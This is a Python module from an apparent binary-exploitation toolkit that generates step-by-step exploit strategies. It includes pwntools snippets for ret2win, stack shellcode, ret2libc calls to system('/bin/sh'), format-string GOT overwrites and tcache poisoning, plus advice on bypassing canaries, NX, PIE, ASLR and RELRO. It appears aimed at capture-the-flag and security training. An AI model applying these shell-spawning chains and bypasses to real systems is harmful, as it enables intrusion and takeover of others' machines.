"""
Exploit Strategy Advisor.

Provides natural language guidance and step-by-step exploit
strategies based on binary analysis and detected vulnerabilities.
"""

import json
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple, Union

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.vulns.detector import Vulnerability, VulnType
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)

# Try to import LLM libraries for enhanced advice
try:
    import anthropic
    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False


class ExploitDifficulty(Enum):
    """Difficulty rating for exploits."""
    TRIVIAL = auto()    # Script kiddie level
    EASY = auto()       # Basic knowledge needed
    MEDIUM = auto()     # Requires understanding of protections
    HARD = auto()       # Multiple techniques needed
    EXPERT = auto()     # Research-level difficulty


class ExploitTechnique(Enum):
    """Available exploitation techniques."""
    RET2WIN = "ret2win"
    SHELLCODE = "shellcode"
    RET2LIBC = "ret2libc"
    RET2SYSTEM = "ret2system"
    ROP_CHAIN = "rop_chain"
    RET2CSU = "ret2csu"
    RET2DLRESOLVE = "ret2dlresolve"
    SROP = "srop"
    FORMAT_WRITE = "format_write"
    FORMAT_LEAK = "format_leak"
    HEAP_TCACHE = "heap_tcache"
    HEAP_FASTBIN = "heap_fastbin"
    HEAP_UNSORTED = "heap_unsorted"
    HOUSE_OF_FORCE = "house_of_force"
    GOT_OVERWRITE = "got_overwrite"
    STACK_PIVOT = "stack_pivot"
    PARTIAL_OVERWRITE = "partial_overwrite"
    ONE_GADGET = "one_gadget"


@dataclass
class ExploitStep:
    """A single step in the exploitation process."""
    step_number: int
    title: str
    description: str
    code_snippet: str = ""
    notes: List[str] = field(default_factory=list)
    prerequisites: List[str] = field(default_factory=list)

    def __str__(self) -> str:
        lines = [f"Step {self.step_number}: {self.title}"]
        lines.append(f"  {self.description}")
        if self.code_snippet:
            lines.append(f"  Code:\n    {self.code_snippet.replace(chr(10), chr(10) + '    ')}")
        for note in self.notes:
            lines.append(f"  Note: {note}")
        return "\n".join(lines)


@dataclass
class ExploitStrategy:
    """Complete exploitation strategy."""
    vulnerability_type: str
    difficulty: ExploitDifficulty
    techniques: List[ExploitTechnique]
    steps: List[ExploitStep]
    prerequisites: List[str]
    challenges: List[str]
    alternative_approaches: List[str] = field(default_factory=list)
    estimated_payload_size: int = 0
    requires_leak: bool = False
    requires_brute_force: bool = False

    def __str__(self) -> str:
        lines = [
            f"Exploit Strategy for {self.vulnerability_type}",
            f"Difficulty: {self.difficulty.name}",
            f"Techniques: {', '.join(t.value for t in self.techniques)}",
            "",
            "Prerequisites:",
        ]
        for prereq in self.prerequisites:
            lines.append(f"  - {prereq}")

        lines.append("\nSteps:")
        for step in self.steps:
            lines.append(str(step))

        if self.challenges:
            lines.append("\nChallenges:")
            for challenge in self.challenges:
                lines.append(f"  - {challenge}")

        if self.alternative_approaches:
            lines.append("\nAlternatives:")
            for alt in self.alternative_approaches:
                lines.append(f"  - {alt}")

        return "\n".join(lines)


class ExploitAdvisor:
    """
    Provides exploitation guidance based on binary analysis.

    Analyzes binary protections, detected vulnerabilities, and
    available primitives to suggest exploitation strategies.

    Example:
        advisor = ExploitAdvisor(binary)

        # Get strategy for detected vulnerability
        strategy = advisor.get_strategy(vulnerability)

        # Print step-by-step guidance
        print(strategy)

        # Get technique-specific advice
        advice = advisor.get_technique_advice(ExploitTechnique.RET2LIBC)
    """

    def __init__(
        self,
        binary: Binary,
        context: Optional[ExploitContext] = None,
        use_llm: bool = False,
        api_key: Optional[str] = None
    ):
        """
        Initialize advisor.

        Args:
            binary: Target binary
            context: Exploitation context (for leaks, etc.)
            use_llm: Use LLM for enhanced advice
            api_key: API key for LLM
        """
        self.binary = binary
        self.context = context or ExploitContext(
            arch=binary.arch,
            bits=binary.bits
        )
        self.use_llm = use_llm and ANTHROPIC_AVAILABLE
        self.api_key = api_key

        # Analyze binary capabilities
        self._analyze_binary()

    def _analyze_binary(self):
        """Analyze binary for exploitation capabilities."""
        self.protections = self.binary.protections

        # Check for useful functions
        self.has_win_func = self._find_win_function()
        self.has_system = 'system' in self.binary.plt
        self.has_execve = 'execve' in self.binary.plt

        # Check for useful gadgets (simplified)
        self.has_syscall = self._check_syscall_gadget()

        # Check libc availability
        self.has_libc = bool(self.context.libc_base or
                            any(f in self.binary.plt for f in ['puts', 'printf', 'write']))

    def _find_win_function(self) -> Optional[str]:
        """Look for obvious win functions."""
        win_names = {'win', 'flag', 'shell', 'get_flag', 'print_flag', 'secret', 'backdoor'}
        for func in self.binary.functions:
            if any(w in func.lower() for w in win_names):
                return func
        return None

    def _check_syscall_gadget(self) -> bool:
        """Check if syscall gadget available."""
        # Would use gadget finder in real implementation
        return not self.protections.pie  # More likely in non-PIE

    def get_strategy(self, vulnerability: Vulnerability) -> ExploitStrategy:
        """
        Get exploitation strategy for a vulnerability.

        Args:
            vulnerability: Detected vulnerability

        Returns:
            Exploitation strategy with steps
        """
        vuln_type = vulnerability.vuln_type

        if vuln_type == VulnType.STACK_BUFFER_OVERFLOW:
            return self._strategy_stack_bof(vulnerability)
        elif vuln_type == VulnType.FORMAT_STRING:
            return self._strategy_format_string(vulnerability)
        elif vuln_type == VulnType.HEAP_BUFFER_OVERFLOW:
            return self._strategy_heap_overflow(vulnerability)
        elif vuln_type == VulnType.USE_AFTER_FREE:
            return self._strategy_uaf(vulnerability)
        else:
            return self._strategy_generic(vulnerability)

    def _strategy_stack_bof(self, vuln: Vulnerability) -> ExploitStrategy:
        """Generate strategy for stack buffer overflow."""
        steps = []
        techniques = []
        challenges = []
        prerequisites = []
        alternatives = []

        step_num = 1

        # Step 1: Determine offset
        steps.append(ExploitStep(
            step_number=step_num,
            title="Find offset to return address",
            description="Use cyclic pattern to determine exact offset to overwrite RIP/EIP",
            code_snippet="""from pwn import *
pattern = cyclic(200)
# Send pattern, find crash offset
offset = cyclic_find(core.read(core.rsp, 4))  # or use EIP value""",
            notes=["Use gdb-peda, pwndbg, or pwntools cyclic"]
        ))
        step_num += 1

        # Determine technique based on protections
        if self.has_win_func:
            # Simple ret2win
            techniques.append(ExploitTechnique.RET2WIN)

            steps.append(ExploitStep(
                step_number=step_num,
                title="Return to win function",
                description=f"Overwrite return address with {self.has_win_func}",
                code_snippet=f"""payload = b'A' * offset
payload += p64(binary.symbols['{self.has_win_func}'])""",
            ))
            step_num += 1

            return ExploitStrategy(
                vulnerability_type="Stack Buffer Overflow",
                difficulty=ExploitDifficulty.TRIVIAL,
                techniques=techniques,
                steps=steps,
                prerequisites=["Offset to return address"],
                challenges=[],
                estimated_payload_size=vuln.details.get('buffer_size', 100) + 8,
                requires_leak=False
            )

        # Check NX
        if not self.protections.nx:
            # Shellcode execution
            techniques.append(ExploitTechnique.SHELLCODE)

            steps.append(ExploitStep(
                step_number=step_num,
                title="Execute shellcode on stack",
                description="NX disabled - can execute shellcode directly",
                code_snippet="""shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'\\x90')
payload += p64(stack_addr)  # Jump to shellcode""",
                notes=["Need stack address (may need leak if ASLR enabled)"]
            ))
            step_num += 1

            if self.protections.aslr:
                challenges.append("ASLR enabled - need stack address leak")
                prerequisites.append("Stack address leak")

        elif not self.protections.pie and self.has_system:
            # ret2system with PLT
            techniques.append(ExploitTechnique.RET2SYSTEM)

            steps.append(ExploitStep(
                step_number=step_num,
                title="Leak libc address",
                description="Use PLT/GOT to leak libc base",
                code_snippet="""# Use puts to leak GOT entry
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.symbols['main'])  # Return to main""",
            ))
            step_num += 1

            steps.append(ExploitStep(
                step_number=step_num,
                title="Call system('/bin/sh')",
                description="Use leaked libc to call system",
                code_snippet="""libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)""",
            ))

            prerequisites.extend([
                "pop rdi gadget",
                "ret gadget (for stack alignment)"
            ])
            challenges.append("Stack must be 16-byte aligned before call")

        elif self.protections.pie and self.protections.aslr:
            # Need PIE leak first
            techniques.extend([ExploitTechnique.PARTIAL_OVERWRITE, ExploitTechnique.RET2LIBC])

            steps.append(ExploitStep(
                step_number=step_num,
                title="Leak PIE base (partial overwrite)",
                description="Overwrite only low bytes to redirect within binary",
                code_snippet="""# Partial overwrite - only last 1-2 bytes
# PIE randomizes only upper bytes
payload = b'A' * offset
payload += p16(target_offset)  # Low 12 bits fixed""",
                notes=["May need 1/16 brute force for ASLR nibble"]
            ))
            step_num += 1

            challenges.extend([
                "PIE enabled - binary base randomized",
                "May require brute forcing 4 bits",
            ])

        else:
            # Generic ROP
            techniques.append(ExploitTechnique.ROP_CHAIN)

            steps.append(ExploitStep(
                step_number=step_num,
                title="Build ROP chain",
                description="Chain gadgets for arbitrary execution",
                code_snippet="""# Use ropper or ROPgadget to find gadgets
rop = ROP(binary)
rop.call('puts', [binary.got['puts']])
rop.call('main')""",
            ))

        # Add alternatives
        if not self.has_win_func:
            alternatives.append("SROP if sigreturn gadget available")
            alternatives.append("ret2dlresolve to resolve arbitrary function")

        return ExploitStrategy(
            vulnerability_type="Stack Buffer Overflow",
            difficulty=self._calculate_difficulty(techniques),
            techniques=techniques,
            steps=steps,
            prerequisites=prerequisites,
            challenges=challenges,
            alternative_approaches=alternatives,
            estimated_payload_size=vuln.details.get('buffer_size', 100) + 100,
            requires_leak=self.protections.aslr or self.protections.pie
        )

    def _strategy_format_string(self, vuln: Vulnerability) -> ExploitStrategy:
        """Generate strategy for format string vulnerability."""
        steps = []
        techniques = [ExploitTechnique.FORMAT_LEAK]
        challenges = []

        step_num = 1

        # Step 1: Find offset
        steps.append(ExploitStep(
            step_number=step_num,
            title="Find format string offset",
            description="Determine which argument position contains our input",
            code_snippet="""# Send pattern like AAAA.%p.%p.%p...
# Look for 0x41414141 (AAAA) to find offset
for i in range(1, 20):
    payload = f'AAAA%{i}$p'
    # If shows 0x41414141, offset is i""",
        ))
        step_num += 1

        # Step 2: Leak addresses
        steps.append(ExploitStep(
            step_number=step_num,
            title="Leak stack/libc addresses",
            description="Use %p to leak useful addresses",
            code_snippet="""# Leak stack address
payload = '%p.' * 20  # Dump stack values
# Look for addresses starting with 0x7f (libc) or 0x7ff (stack)""",
        ))
        step_num += 1

        # Determine write strategy
        if not self.protections.relro:  # Partial or no RELRO
            techniques.append(ExploitTechnique.GOT_OVERWRITE)

            steps.append(ExploitStep(
                step_number=step_num,
                title="Overwrite GOT entry",
                description="Use %n to write to GOT",
                code_snippet="""# Overwrite exit@GOT with win/system
# Use %hhn for byte-by-byte write
target = binary.got['exit']
writes = {target: system_addr}
payload = fmtstr_payload(offset, writes)""",
                notes=["Use pwntools fmtstr_payload for automatic generation"]
            ))
            step_num += 1

        elif self.protections.canary:
            # Overwrite return address directly
            steps.append(ExploitStep(
                step_number=step_num,
                title="Leak canary and overwrite return",
                description="Leak canary value, then format string write past it",
                code_snippet="""# Leak canary (usually at specific stack offset)
canary_leak = '%XX$p'  # Find correct offset
# Then overwrite saved RIP""",
            ))
            step_num += 1

            challenges.append("Need to leak canary value first")

        challenges.extend([
            "May need multiple format string calls",
            "Calculate correct byte values for %n writes"
        ])

        return ExploitStrategy(
            vulnerability_type="Format String",
            difficulty=ExploitDifficulty.MEDIUM,
            techniques=techniques,
            steps=steps,
            prerequisites=["Format string offset", "Target address to overwrite"],
            challenges=challenges,
            alternative_approaches=["Stack buffer overwrite if offset reachable"],
            requires_leak=True
        )

    def _strategy_heap_overflow(self, vuln: Vulnerability) -> ExploitStrategy:
        """Generate strategy for heap overflow."""
        steps = []
        techniques = []
        challenges = []

        step_num = 1

        # Analyze heap type
        steps.append(ExploitStep(
            step_number=step_num,
            title="Identify glibc version",
            description="Determine heap allocator version for technique selection",
            code_snippet="""# Check glibc version
# 2.26+: tcache
# 2.29+: tcache key (double-free protection)
# 2.32+: safe-linking""",
        ))
        step_num += 1

        # Modern glibc - tcache
        techniques.append(ExploitTechnique.HEAP_TCACHE)

        steps.append(ExploitStep(
            step_number=step_num,
            title="Tcache poisoning",
            description="Corrupt tcache fd pointer for arbitrary allocation",
            code_snippet="""# Allocate and free chunk into tcache
alloc(0x20)  # Goes to tcache
free(0)

# Overflow to corrupt fd pointer
overflow_data = p64(target_addr)
# Next allocation at target""",
            notes=["Safe-linking in 2.32+: fd = (addr >> 12) ^ next"]
        ))
        step_num += 1

        if self.protections.relro:
            # Need hook or other target
            steps.append(ExploitStep(
                step_number=step_num,
                title="Target __free_hook or __malloc_hook",
                description="Allocate chunk at hook to redirect execution",
                code_snippet="""target = libc.symbols['__free_hook']
# Tcache poison to allocate at __free_hook
# Write system or one_gadget
# Then free() calls our function""",
                notes=["Hooks removed in glibc 2.34+"]
            ))
        else:
            techniques.append(ExploitTechnique.GOT_OVERWRITE)

        challenges.extend([
            "Need heap address leak for safe-linking bypass",
            "May need to fill tcache (7 entries) first"
        ])

        return ExploitStrategy(
            vulnerability_type="Heap Overflow",
            difficulty=ExploitDifficulty.HARD,
            techniques=techniques,
            steps=steps,
            prerequisites=["Libc leak", "Heap address leak (if safe-linking)"],
            challenges=challenges,
            alternative_approaches=[
                "House of Force if top chunk overflow",
                "Unsorted bin attack for arbitrary write"
            ],
            requires_leak=True
        )

    def _strategy_uaf(self, vuln: Vulnerability) -> ExploitStrategy:
        """Generate strategy for use-after-free."""
        steps = []
        techniques = [ExploitTechnique.HEAP_TCACHE]

        step_num = 1

        steps.append(ExploitStep(
            step_number=step_num,
            title="Trigger UAF condition",
            description="Free chunk, then use it again",
            code_snippet="""# Allocate chunk
chunk = alloc(0x80)
# Free it
free(chunk)
# Chunk still accessible - UAF""",
        ))
        step_num += 1

        steps.append(ExploitStep(
            step_number=step_num,
            title="Reclaim freed chunk",
            description="Allocate new chunk of same size to reuse memory",
            code_snippet="""# Allocate same size - gets same memory
new_chunk = alloc(0x80, data=payload)
# original chunk pointer now points to payload""",
        ))
        step_num += 1

        steps.append(ExploitStep(
            step_number=step_num,
            title="Exploit reclaimed chunk",
            description="Use original pointer to trigger controlled behavior",
            code_snippet="""# If chunk has function pointer:
payload = p64(target_function)
# Using original pointer calls our function""",
        ))

        return ExploitStrategy(
            vulnerability_type="Use-After-Free",
            difficulty=ExploitDifficulty.MEDIUM,
            techniques=techniques,
            steps=steps,
            prerequisites=["Understanding of chunk layout", "Control over allocation sizes"],
            challenges=["Need overlapping allocation of same size"],
            alternative_approaches=["Double-free for tcache poisoning"],
            requires_leak=True
        )

    def _strategy_generic(self, vuln: Vulnerability) -> ExploitStrategy:
        """Generic strategy for unknown vulnerability types."""
        return ExploitStrategy(
            vulnerability_type=str(vuln.vuln_type),
            difficulty=ExploitDifficulty.MEDIUM,
            techniques=[ExploitTechnique.ROP_CHAIN],
            steps=[
                ExploitStep(
                    step_number=1,
                    title="Analyze vulnerability",
                    description="Understand the vulnerability primitive",
                ),
                ExploitStep(
                    step_number=2,
                    title="Determine exploitation path",
                    description="Based on available primitives and protections",
                ),
            ],
            prerequisites=["Vulnerability analysis"],
            challenges=["Unknown vulnerability type"],
        )

    def _calculate_difficulty(self, techniques: List[ExploitTechnique]) -> ExploitDifficulty:
        """Calculate overall difficulty based on techniques needed."""
        difficulty_scores = {
            ExploitTechnique.RET2WIN: 1,
            ExploitTechnique.SHELLCODE: 2,
            ExploitTechnique.RET2SYSTEM: 3,
            ExploitTechnique.RET2LIBC: 3,
            ExploitTechnique.FORMAT_LEAK: 2,
            ExploitTechnique.FORMAT_WRITE: 4,
            ExploitTechnique.ROP_CHAIN: 4,
            ExploitTechnique.RET2CSU: 5,
            ExploitTechnique.RET2DLRESOLVE: 6,
            ExploitTechnique.SROP: 5,
            ExploitTechnique.HEAP_TCACHE: 5,
            ExploitTechnique.PARTIAL_OVERWRITE: 4,
        }

        max_score = max(difficulty_scores.get(t, 3) for t in techniques) if techniques else 3

        # Add for protections
        if self.protections.canary:
            max_score += 1
        if self.protections.pie:
            max_score += 1
        if self.protections.relro:
            max_score += 1

        if max_score <= 2:
            return ExploitDifficulty.TRIVIAL
        elif max_score <= 4:
            return ExploitDifficulty.EASY
        elif max_score <= 6:
            return ExploitDifficulty.MEDIUM
        elif max_score <= 8:
            return ExploitDifficulty.HARD
        else:
            return ExploitDifficulty.EXPERT

    def get_technique_advice(self, technique: ExploitTechnique) -> str:
        """
        Get detailed advice for a specific technique.

        Args:
            technique: Exploitation technique

        Returns:
            Detailed explanation and tips
        """
        advice = {
            ExploitTechnique.RET2WIN: """
ret2win - Return to Win Function
================================
The simplest exploitation technique. Overwrite return address to
redirect execution to a "win" function that prints flag or spawns shell.

Steps:
1. Find offset to return address (cyclic pattern)
2. Find win function address (objdump -t binary | grep win)
3. Craft payload: padding + win_address

Tips:
- Check if win function needs arguments
- Verify stack alignment (add 'ret' gadget if needed)
- Works best with PIE disabled
""",

            ExploitTechnique.RET2LIBC: """
ret2libc - Return to libc
=========================
Call libc functions (usually system) by returning to them with
controlled arguments.

Steps:
1. Leak libc address (puts(got['puts']))
2. Calculate libc base
3. Find system() and "/bin/sh" in libc
4. Build ROP chain: pop rdi; ret -> binsh -> system

Requirements:
- Libc address leak
- pop rdi gadget
- ret gadget for alignment (x86-64)

Tips:
- Use libc.rip or libc-database to identify libc version
- One-gadget can simplify (single address execve)
- Check stack alignment before call
""",

            ExploitTechnique.SROP: """
SROP - Sigreturn Oriented Programming
=====================================
Abuse sigreturn syscall to set all registers at once.

Steps:
1. Find syscall gadget
2. Find way to set rax=15 (sigreturn)
3. Craft fake sigframe with desired register state
4. Trigger sigreturn to execute arbitrary syscall

Use cases:
- Very limited gadgets available
- Need to set many registers
- Statically linked binaries

Tips:
- Use pwntools SigreturnFrame()
- Can chain multiple sigrets
- Works well for execve syscall
""",

            ExploitTechnique.HEAP_TCACHE: """
Tcache Poisoning
================
Corrupt tcache bin fd pointer for arbitrary allocation.

Glibc versions:
- 2.26+: tcache introduced
- 2.29+: tcache key (double-free check)
- 2.32+: safe-linking (fd = (addr >> 12) ^ next)

Steps:
1. Allocate and free chunk (goes to tcache)
2. Corrupt fd pointer (via overflow/UAF)
3. Next allocation returns arbitrary address
4. Write payload to target

Targets:
- __free_hook (< 2.34)
- __malloc_hook (< 2.34)
- Function pointers
- GOT entries (if not Full RELRO)

Tips:
- Fill tcache (7 entries) for fastbin/unsorted
- Heap address needed for safe-linking bypass
""",

            ExploitTechnique.FORMAT_WRITE: """
Format String Write
===================
Use %n to write arbitrary values to arbitrary addresses.

Offset finding:
- Send AAAA%p%p%p... look for 0x41414141
- That position is your offset

Write primitives:
- %n: Write 4 bytes (printed count)
- %hn: Write 2 bytes
- %hhn: Write 1 byte (most precise)

Payload structure:
- %[width]c: Print [width] characters
- %[offset]$[size]n: Write at offset

Tips:
- Use pwntools fmtstr_payload()
- Calculate writes carefully
- May need multiple calls
- Target GOT entries or hooks
""",
        }

        return advice.get(technique, f"No detailed advice available for {technique.value}")

    def get_protection_bypass_advice(self) -> Dict[str, str]:
        """Get advice for bypassing enabled protections."""
        advice = {}

        if self.protections.canary:
            advice["canary"] = """
Stack Canary Bypass:
- Leak canary via format string (%XX$p)
- Leak canary via info disclosure
- Bypass via overwrite in different order (e.g., scanf %s stops at null)
- Brute force (1/256 per byte, forking servers only)
"""

        if self.protections.nx:
            advice["nx"] = """
NX Bypass:
- ROP chains (use existing code)
- ret2libc/ret2system
- mprotect to make region executable
- SROP for syscalls
"""

        if self.protections.pie:
            advice["pie"] = """
PIE Bypass:
- Partial overwrite (low 12 bits are fixed)
- Leak binary address first
- Brute force (4 bits, 1/16 probability)
- Format string to leak addresses
"""

        if self.protections.aslr:
            advice["aslr"] = """
ASLR Bypass:
- Information leak (puts, write, printf)
- Format string address leak
- Partial overwrite (affects only high bytes)
- Brute force (32-bit: feasible, 64-bit: need leak)
"""

        if self.protections.relro:
            advice["relro"] = """
RELRO Bypass:
- Full RELRO: Cannot overwrite GOT
  - Target: __malloc_hook, __free_hook, stack, exit handlers
- Partial RELRO: GOT writable after startup
  - Target: GOT entries of unused functions
"""

        return advice

    def suggest_tools(self) -> List[Tuple[str, str]]:
        """Suggest tools for exploitation."""
        tools = [
            ("pwntools", "Python exploitation framework"),
            ("gdb-pwndbg/gef", "Enhanced GDB for exploitation"),
            ("ropper/ROPgadget", "ROP gadget finding"),
            ("one_gadget", "Find magic one-shot gadgets"),
        ]

        if self.protections.pie:
            tools.append(("checksec", "Verify binary protections"))

        if 'malloc' in self.binary.plt or 'free' in self.binary.plt:
            tools.append(("pwndbg heap", "Heap visualization and analysis"))

        return tools


# Convenience function
def get_exploit_advice(
    binary: Binary,
    vulnerability: Optional[Vulnerability] = None
) -> str:
    """
    Get exploitation advice for a binary.

    Args:
        binary: Target binary
        vulnerability: Detected vulnerability (optional)

    Returns:
        Formatted advice string
    """
    advisor = ExploitAdvisor(binary)

    lines = [f"Exploitation Advice for: {binary.path}"]
    lines.append("=" * 60)

    # Protections summary
    lines.append(f"\nProtections:")
    lines.append(f"  NX: {binary.protections.nx}")
    lines.append(f"  Canary: {binary.protections.canary}")
    lines.append(f"  PIE: {binary.protections.pie}")
    lines.append(f"  RELRO: {binary.protections.relro}")

    # Win function
    if advisor.has_win_func:
        lines.append(f"\n[+] Found win function: {advisor.has_win_func}")

    # Protection bypass advice
    bypass_advice = advisor.get_protection_bypass_advice()
    if bypass_advice:
        lines.append("\nProtection Bypass Strategies:")
        for prot, advice in bypass_advice.items():
            lines.append(advice)

    # Strategy for vulnerability
    if vulnerability:
        strategy = advisor.get_strategy(vulnerability)
        lines.append(f"\n{strategy}")

    # Suggested tools
    lines.append("\nSuggested Tools:")
    for tool, desc in advisor.suggest_tools():
        lines.append(f"  - {tool}: {desc}")

    return "\n".join(lines)
